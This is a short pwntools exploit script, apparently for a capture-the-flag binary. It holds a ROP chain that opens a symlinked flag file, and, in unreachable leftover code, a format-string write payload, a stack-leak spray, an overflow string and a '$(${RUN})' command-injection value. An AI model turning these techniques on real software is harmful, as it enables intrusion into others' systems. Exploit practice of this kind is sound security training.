#!/usr/bin/env python

from pwn import *
import os

p = process ("./Get-flag-without-write-nor-exec")


print(p.recv)
p.sendline("4")

print(p.recv)

rbp_addr = 0x602800 + 0x14
buf = "A" * 16 + p64(rbp_addr)#+ p64(0x400b60) + p64(0x400b30)

os.symlink("flag", "$")
"""
0x0000000000400d93 : pop rdi ; ret
0x0000000000400d91 : pop rsi ; pop r15 ; ret
"""
buf += p64(0x400d93)
buf += p64(0x400fa8) #$
buf += p64(0x400d91)
buf += p64(0) + p64(0)
buf += p64(0x4008a0) #open

buf += p64(0x400d93)
buf += p64(0x400fa8) #$
buf += p64(0x400d91)
buf += p64(0x602800) + p64(0x602800)
#buf += p64(0x400b08) #mov 0x200 edx
buf += p64(0x400850)

buf += p64(0x400b18)


#gdb.attach(p)

p.sendline(buf)

#p.wait()
exit_code = p.poll()

print(exit_code)



p.interactive()

exit()
addr = 0x601060

print(hex(addr))

buf = "%23$p%512%16$n"
buf += "BB"
print(len(buf))
buf += p64(addr)

with open("e.txt", "w") as f:
    f.write(buf)
    f.close()

buf = "%p " *50
p.sendline(buf)

data = p.recv()
print(repr(data))



addr_temp = data[30:38]
print (repr(addr_temp))


buf = "A" *200

p.sendline(buf)
print(p.recv())

exit()


print (p.recv())
p.sendline('$(${RUN})')
print (p.recv())
